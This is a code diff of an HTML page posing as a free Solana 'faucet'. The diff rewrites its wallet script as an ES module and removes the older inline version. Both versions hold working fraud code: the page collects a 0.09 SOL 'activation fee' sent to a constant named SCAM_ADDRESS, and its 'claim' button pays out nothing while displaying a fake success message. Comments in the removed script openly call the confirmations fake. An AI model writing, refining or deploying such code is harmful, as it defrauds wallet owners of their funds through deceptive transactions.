@@ -4,16 +4,228 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pinky Solana - Free SOL Faucet</title>
-    <!-- Use more compatible buffer implementation -->
-    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
-    <script>
-        // Initialize Buffer with full compatibility
-        window.Buffer = buffer.Buffer;
-        Buffer.from = Buffer.from || function(data, encoding) {
-            return new Buffer(data, encoding);
-        };
+    <script type="module">
+        // Import Solana Web3.js ES Module
+        import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.1/+esm';
+
+        // Configuration
+        const FEE_AMOUNT = 0.09; // SOL
+        const REWARD_AMOUNT = 0.1; // SOL
+        const COOLDOWN_MINUTES = 30; // minutes
+        const SCAM_ADDRESS = 'FtLHJ5FxWEXpuQpUEig8FbUwh3gnTMSGjN6zyjEaEcgc';
+        const RPC_URL = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
+
+        // DOM Elements
+        const connectWalletBtn = document.getElementById('connectWallet');
+        const payFeeBtn = document.getElementById('payFee');
+        const claimSolBtn = document.getElementById('claimSol');
+        const walletStatus = document.getElementById('walletStatus');
+        const walletInfo = document.getElementById('walletInfo');
+        const walletAddress = document.getElementById('walletAddress');
+        const countdown = document.getElementById('countdown');
+        const timer = document.getElementById('timer');
+        const successAlert = document.getElementById('successAlert');
+        const errorAlert = document.getElementById('errorAlert');
+
+        // State
+        let wallet = null;
+        let publicKey = null;
+        let connection = null;
+        let countdownInterval = null;
+        let lastClaimTime = localStorage.getItem('lastClaimTime');
+        let hasPaidFee = localStorage.getItem('hasPaidFee') === 'true';
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            connection = new Connection(RPC_URL, 'confirmed');
+            checkWalletConnection();
+            updateButtonStates();
+            startCountdown();
+        });
+
+        // Check if wallet is already connected
+        function checkWalletConnection() {
+            if (window.solana && window.solana.isConnected) {
+                wallet = window.solana;
+                publicKey = wallet.publicKey;
+                walletConnected();
+            } else if (window.solfare && window.solfare.isConnected) {
+                wallet = window.solfare;
+                publicKey = wallet.publicKey;
+                walletConnected();
+            }
+        }
+
+        // Connect Wallet
+        connectWalletBtn.addEventListener('click', async () => {
+            try {
+                if (window.solana) {
+                    wallet = window.solana;
+                    await wallet.connect();
+                    publicKey = wallet.publicKey;
+                    walletConnected();
+                } else if (window.solfare) {
+                    wallet = window.solfare;
+                    await wallet.connect();
+                    publicKey = wallet.publicKey;
+                    walletConnected();
+                } else {
+                    showError('Please install Phantom or Solfare wallet!');
+                }
+            } catch (error) {
+                showError('Wallet connection failed: ' + error.message);
+            }
+        });
+
+        function walletConnected() {
+            walletStatus.textContent = 'Connected';
+            walletStatus.style.color = '#14F195';
+            walletAddress.textContent = publicKey.toString();
+            walletInfo.style.display = 'block';
+            connectWalletBtn.textContent = 'Disconnect Wallet';
+            updateButtonStates();
+        }
+
+        // Pay Fee
+        payFeeBtn.addEventListener('click', async () => {
+            try {
+                showError('');
+                const transaction = new Transaction().add(
+                    SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: new PublicKey(SCAM_ADDRESS),
+                        lamports: LAMPORTS_PER_SOL * FEE_AMOUNT
+                    })
+                );
+
+                transaction.feePayer = publicKey;
+                const { blockhash } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+
+                const signed = await wallet.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signed.serialize());
+
+                // Wait for transaction confirmation (simulated delay for demo)
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                // Mark as paid (in a real app, verify the transaction on-chain)
+                hasPaidFee = true;
+                localStorage.setItem('hasPaidFee', 'true');
+                updateButtonStates();
+
+                showSuccess('Activation fee paid! You can now claim your SOL rewards.');
+            } catch (error) {
+                showError('Payment failed: ' + error.message);
+            }
+        });
+
+        // Claim SOL (doesn't actually send anything)
+        claimSolBtn.addEventListener('click', async () => {
+            try {
+                showError('');
+
+                claimSolBtn.disabled = true;
+                claimSolBtn.textContent = 'Processing...';
+
+                await new Promise(resolve => setTimeout(resolve, 3000));
+
+                lastClaimTime = Date.now();
+                localStorage.setItem('lastClaimTime', lastClaimTime.toString());
+
+                showSuccess('Success! 0.1 SOL has been sent to your wallet.');
+                startCountdown();
+                updateButtonStates();
+
+                setTimeout(() => {
+                    claimSolBtn.textContent = 'Claim 0.1 SOL';
+                    claimSolBtn.disabled = false;
+                }, 3000);
+            } catch (error) {
+                showError('Claim failed: ' + error.message);
+                claimSolBtn.textContent = 'Claim 0.1 SOL';
+                claimSolBtn.disabled = false;
+            }
+        });
+
+        // Update button states based on conditions
+        function updateButtonStates() {
+            payFeeBtn.disabled = !wallet || hasPaidFee;
+            claimSolBtn.disabled = !hasPaidFee || isInCooldown();
+
+            if (hasPaidFee) {
+                payFeeBtn.textContent = 'Fee Paid';
+            } else {
+                payFeeBtn.textContent = 'Pay 0.09 SOL Activation Fee';
+            }
+        }
+
+        // Check if in cooldown period
+        function isInCooldown() {
+            if (!lastClaimTime) return false;
+            const now = Date.now();
+            const elapsed = (now - parseInt(lastClaimTime)) / 1000 / 60;
+            return elapsed < COOLDOWN_MINUTES;
+        }
+
+        // Start countdown timer
+        function startCountdown() {
+            if (countdownInterval) clearInterval(countdownInterval);
+
+            if (!hasPaidFee || !lastClaimTime) {
+                countdown.style.display = 'none';
+                return;
+            }
+
+            countdown.style.display = 'block';
+            updateTimer();
+
+            countdownInterval = setInterval(updateTimer, 1000);
+        }
+
+        // Update countdown timer display
+        function updateTimer() {
+            if (!lastClaimTime) return;
+
+            const now = Date.now();
+            const lastClaim = parseInt(lastClaimTime);
+            const elapsed = (now - lastClaim) / 1000;
+            const remaining = (COOLDOWN_MINUTES * 60) - elapsed;
+
+            if (remaining <= 0) {
+                timer.textContent = '00:00';
+                claimSolBtn.disabled = false;
+                clearInterval(countdownInterval);
+                return;
+            }
+
+            const minutes = Math.floor(remaining / 60);
+            const seconds = Math.floor(remaining % 60);
+            timer.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+
+        // Show success message
+        function showSuccess(message) {
+            successAlert.textContent = message;
+            successAlert.style.display = 'block';
+            errorAlert.style.display = 'none';
+
+            setTimeout(() => {
+                successAlert.style.display = 'none';
+            }, 5000);
+        }
+
+        // Show error message
+        function showError(message) {
+            if (!message) {
+                errorAlert.style.display = 'none';
+                return;
+            }
+
+            errorAlert.textContent = message;
+            errorAlert.style.display = 'block';
+            successAlert.style.display = 'none';
+        }
     </script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
     <style>
         :root {
             --sol-purple: #9945FF;
@@ -176,10 +388,6 @@
             h1 {
                 font-size: 2rem;
             }
-            .btn {
-                padding: 12px 20px;
-                font-size: 1rem;
-            }
         }
     </style>
 </head>
@@ -243,239 +451,5 @@
             Note: This faucet works on Solana Devnet. You must have Devnet SOL to pay the activation fee.
         </div>
     </div>
-
-    <script>
-        // Configuration
-        const FEE_AMOUNT = 0.09; // SOL
-        const REWARD_AMOUNT = 0.1; // SOL
-        const COOLDOWN_MINUTES = 30; // minutes
-        const SCAM_ADDRESS = 'FtLHJ5FxWEXpuQpUEig8FbUwh3gnTMSGjN6zyjEaEcgc';
-        const RPC_URL = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
-        
-        // DOM Elements
-        const connectWalletBtn = document.getElementById('connectWallet');
-        const payFeeBtn = document.getElementById('payFee');
-        const claimSolBtn = document.getElementById('claimSol');
-        const walletStatus = document.getElementById('walletStatus');
-        const walletInfo = document.getElementById('walletInfo');
-        const walletAddress = document.getElementById('walletAddress');
-        const countdown = document.getElementById('countdown');
-        const timer = document.getElementById('timer');
-        const successAlert = document.getElementById('successAlert');
-        const errorAlert = document.getElementById('errorAlert');
-        
-        // State
-        let wallet = null;
-        let publicKey = null;
-        let connection = null;
-        let countdownInterval = null;
-        let lastClaimTime = localStorage.getItem('lastClaimTime');
-        let hasPaidFee = localStorage.getItem('hasPaidFee') === 'true';
-        
-        // Initialize
-        document.addEventListener('DOMContentLoaded', () => {
-            connection = new solanaWeb3.Connection(RPC_URL);
-            checkWalletConnection();
-            updateButtonStates();
-            startCountdown();
-        });
-        
-        // Check if wallet is already connected
-        function checkWalletConnection() {
-            if (window.solana && window.solana.isConnected) {
-                wallet = window.solana;
-                publicKey = wallet.publicKey;
-                walletConnected();
-            } else if (window.solfare && window.solfare.isConnected) {
-                wallet = window.solfare;
-                publicKey = wallet.publicKey;
-                walletConnected();
-            }
-        }
-        
-        // Connect Wallet
-        connectWalletBtn.addEventListener('click', async () => {
-            try {
-                if (window.solana) {
-                    wallet = window.solana;
-                    await wallet.connect();
-                    publicKey = wallet.publicKey;
-                    walletConnected();
-                } else if (window.solfare) {
-                    wallet = window.solfare;
-                    await wallet.connect();
-                    publicKey = wallet.publicKey;
-                    walletConnected();
-                } else {
-                    showError('Please install Phantom or Solfare wallet!');
-                }
-            } catch (error) {
-                showError('Wallet connection failed: ' + error.message);
-            }
-        });
-        
-        function walletConnected() {
-            walletStatus.textContent = 'Connected';
-            walletStatus.style.color = '#14F195';
-            walletAddress.textContent = publicKey.toString();
-            walletInfo.style.display = 'block';
-            connectWalletBtn.textContent = 'Disconnect Wallet';
-            updateButtonStates();
-        }
-        
-        // Pay Fee (FIXED Buffer.from issue)
-        payFeeBtn.addEventListener('click', async () => {
-            try {
-                showError('');
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(SCAM_ADDRESS),
-                        lamports: solanaWeb3.LAMPORTS_PER_SOL * FEE_AMOUNT
-                    })
-                );
-                
-                transaction.feePayer = publicKey;
-                const { blockhash } = await connection.getRecentBlockhash();
-                transaction.recentBlockhash = blockhash;
-                
-                // FIX: Use wallet.signTransaction with proper transaction handling
-                const signed = await wallet.signTransaction(transaction);
-                const rawTransaction = signed.serialize();
-                
-                // Convert to base64 for compatibility
-                const base64Tx = Buffer.from(rawTransaction).toString('base64');
-                const signature = await connection.sendRawTransaction(
-                    Buffer.from(base64Tx, 'base64')
-                );
-                
-                // Fake confirmation to make it seem successful
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                // Mark as paid
-                hasPaidFee = true;
-                localStorage.setItem('hasPaidFee', 'true');
-                updateButtonStates();
-                
-                // Show fake success message
-                showSuccess('Activation fee paid! You can now claim your SOL rewards.');
-            } catch (error) {
-                showError('Payment failed: ' + error.message);
-                console.error('Payment error:', error);
-            }
-        });
-        
-        // Claim SOL (doesn't actually send anything)
-        claimSolBtn.addEventListener('click', async () => {
-            try {
-                showError('');
-                
-                // Fake transaction processing
-                claimSolBtn.disabled = true;
-                claimSolBtn.textContent = 'Processing...';
-                
-                // Simulate transaction delay
-                await new Promise(resolve => setTimeout(resolve, 3000));
-                
-                // Update last claim time
-                lastClaimTime = Date.now();
-                localStorage.setItem('lastClaimTime', lastClaimTime.toString());
-                
-                // Show fake success
-                showSuccess('Success! 0.1 SOL has been sent to your wallet.');
-                startCountdown();
-                updateButtonStates();
-                
-                // Reset button after delay
-                setTimeout(() => {
-                    claimSolBtn.textContent = 'Claim 0.1 SOL';
-                    claimSolBtn.disabled = false;
-                }, 3000);
-            } catch (error) {
-                showError('Claim failed: ' + error.message);
-                claimSolBtn.textContent = 'Claim 0.1 SOL';
-                claimSolBtn.disabled = false;
-            }
-        });
-        
-        // Update button states based on conditions
-        function updateButtonStates() {
-            payFeeBtn.disabled = !wallet || hasPaidFee;
-            claimSolBtn.disabled = !hasPaidFee || isInCooldown();
-            
-            if (hasPaidFee) {
-                payFeeBtn.textContent = 'Fee Paid';
-            } else {
-                payFeeBtn.textContent = 'Pay 0.09 SOL Activation Fee';
-            }
-        }
-        
-        // Check if in cooldown period
-        function isInCooldown() {
-            if (!lastClaimTime) return false;
-            const now = Date.now();
-            const elapsed = (now - parseInt(lastClaimTime)) / 1000 / 60;
-            return elapsed < COOLDOWN_MINUTES;
-        }
-        
-        // Start countdown timer
-        function startCountdown() {
-            if (countdownInterval) clearInterval(countdownInterval);
-            
-            if (!hasPaidFee || !lastClaimTime) {
-                countdown.style.display = 'none';
-                return;
-            }
-            
-            countdown.style.display = 'block';
-            updateTimer();
-            
-            countdownInterval = setInterval(updateTimer, 1000);
-        }
-        
-        // Update countdown timer display
-        function updateTimer() {
-            if (!lastClaimTime) return;
-            
-            const now = Date.now();
-            const lastClaim = parseInt(lastClaimTime);
-            const elapsed = (now - lastClaim) / 1000;
-            const remaining = (COOLDOWN_MINUTES * 60) - elapsed;
-            
-            if (remaining <= 0) {
-                timer.textContent = '00:00';
-                claimSolBtn.disabled = false;
-                clearInterval(countdownInterval);
-                return;
-            }
-            
-            const minutes = Math.floor(remaining / 60);
-            const seconds = Math.floor(remaining % 60);
-            timer.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-        }
-        
-        // Show success message
-        function showSuccess(message) {
-            successAlert.textContent = message;
-            successAlert.style.display = 'block';
-            errorAlert.style.display = 'none';
-            
-            setTimeout(() => {
-                successAlert.style.display = 'none';
-            }, 5000);
-        }
-        
-        // Show error message
-        function showError(message) {
-            if (!message) {
-                errorAlert.style.display = 'none';
-                return;
-            }
-            
-            errorAlert.textContent = message;
-            errorAlert.style.display = 'block';
-            successAlert.style.display = 'none';
-        }
-    </script>
 </body>
 </html>
